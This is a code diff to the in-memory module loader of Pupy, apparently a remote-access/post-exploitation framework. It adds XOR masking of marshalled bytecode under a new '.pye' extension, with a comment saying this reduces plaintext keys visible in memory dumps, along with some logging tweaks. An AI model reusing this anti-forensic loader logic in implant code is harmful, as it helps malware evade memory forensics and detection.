@@ -29,6 +29,19 @@ def dprint(msg):
     if __debug:
         print msg
 
+def loadpy(src, dst, masked=False):
+    content = src
+    if masked:
+        # Poors man "obfuscation", just to reduce (a bit) amount of our
+        # plaintext keys in mem dump
+        content = bytearray(len(src))
+        for i,x in enumerate(src):
+            content[i] = (x^((2**((65535-i)%65535))%251))
+        content = buffer(content)
+
+    exec (marshal.loads(content), dst)
+    del content
+
 def memtrace(msg):
     global __debug
     global __trace
@@ -165,7 +178,7 @@ def get_module_files(fullname):
         module for module in modules.iterkeys() \
         if module.rsplit(".",1)[0] == path or any([
             path+'/__init__'+ext == module for ext in [
-                '.py', '.pyc', '.pyo'
+                '.py', '.pyc', '.pyo', '.pye'
             ]
         ])
     ]
@@ -287,9 +300,9 @@ class PupyPackageLoader:
         self.fullname = fullname
         self.contents = contents
         self.extension = extension
-        self.is_pkg=is_pkg
-        self.path=path
-        self.archive="" #need this attribute
+        self.is_pkg = is_pkg
+        self.path = path
+        self.archive = '' #need this attribute
 
     def load_module(self, fullname):
         global remote_print_error
@@ -302,7 +315,7 @@ class PupyPackageLoader:
 
             mod=None
             c=None
-            if self.extension=="py":
+            if self.extension=='py':
                 mod = imp.new_module(fullname)
                 mod.__name__ = fullname
                 mod.__file__ = 'pupy://{}'.format(self.path)
@@ -311,11 +324,11 @@ class PupyPackageLoader:
                     mod.__package__ = fullname
                 else:
                     mod.__package__ = fullname.rsplit('.', 1)[0]
-                code = compile(self.contents, mod.__file__, "exec")
+                code = compile(self.contents, mod.__file__, 'exec')
                 sys.modules[fullname] = mod
                 exec (code, mod.__dict__)
 
-            elif self.extension in ["pyc","pyo"]:
+            elif self.extension in ('pyc','pyo','pye'):
                 mod = imp.new_module(fullname)
                 mod.__name__ = fullname
                 mod.__file__ = 'pupy://{}'.format(self.path)
@@ -325,9 +338,13 @@ class PupyPackageLoader:
                 else:
                     mod.__package__ = fullname.rsplit('.', 1)[0]
                 sys.modules[fullname] = mod
-                exec (marshal.loads(self.contents[8:]), mod.__dict__)
+                try:
+                    dprint('Load {} from marshalled file ({})'.format(fullname, self.extension))
+                    loadpy(self.contents[8:], mod.__dict__, self.extension == 'pye')
+                except Exception, e:
+                    dprint('Load {} failed: Exception: {}'.format(fullname, e))
 
-            elif self.extension in ("dll", "pyd", "so"):
+            elif self.extension in ('dll', 'pyd', 'so'):
                 initname = "init" + fullname.rsplit(".",1)[-1]
                 path = self.fullname.rsplit('.', 1)[0].replace(".",'/') + "." + self.extension
                 dprint('Loading {} from memory'.format(fullname))
@@ -395,7 +412,7 @@ class PupyPackageFinder(object):
             else:
                 files = get_module_files(fullname)
 
-            dprint('find_module({},{}) in {})'.format(fullname, path, files))
+            dprint('[L] find_module({},{}) in {})'.format(fullname, path, files))
             if not builtin_memimporter:
                 files = [
                     f for f in files if not f.lower().endswith(('.pyd','.dll','.so'))
@@ -437,15 +454,15 @@ class PupyPackageFinder(object):
             criterias = [
                 lambda f: any([
                     f.endswith('/__init__'+ext) for ext in [
-                        '.pyo', '.pyc', '.py'
+                        '.pye', '.pyo', '.pyc', '.py'
                     ]
                 ]),
-                lambda f: any ([
+                lambda f: any([
                     f.endswith(ext) for ext in [
-                        '.pyo', '.pyc'
+                        '.pye', '.pyo', '.pyc'
                     ]
                 ]),
-                lambda f: any ([
+                lambda f: any([
                     f.endswith(ext) for ext in [
                         '.pyd', '.py', '.so', '.dll'
                     ]
@@ -460,6 +477,7 @@ class PupyPackageFinder(object):
                         break
 
             if not selected:
+                dprint('{} not selected from {}'.format(fullname, files))
                 return None
 
             content = modules[selected]
@@ -467,7 +485,7 @@ class PupyPackageFinder(object):
 
             extension = selected.rsplit(".",1)[1].strip().lower()
             is_pkg = any([
-                selected.endswith('/__init__'+ext) for ext in [ '.pyo', '.pyc', '.py' ]
+                selected.endswith('/__init__'+ext) for ext in [ '.pye', '.pyo', '.pyc', '.py' ]
             ])
 
             dprint('--> Loading {} ({}) package={}'.format(
@@ -487,7 +505,7 @@ class PupyPackageFinder(object):
             if selected and \
               not selected.startswith(('network/conf', 'pupytasks')) and \
               selected in modules:
-                dprint('XXX {} remove {} from bundle / count = {}'.format(fullname, selected, len(modules)))
+                dprint('[L] {} remove {} from bundle / count = {}'.format(fullname, selected, len(modules)))
                 del modules[selected]
 
             imp.release_lock()
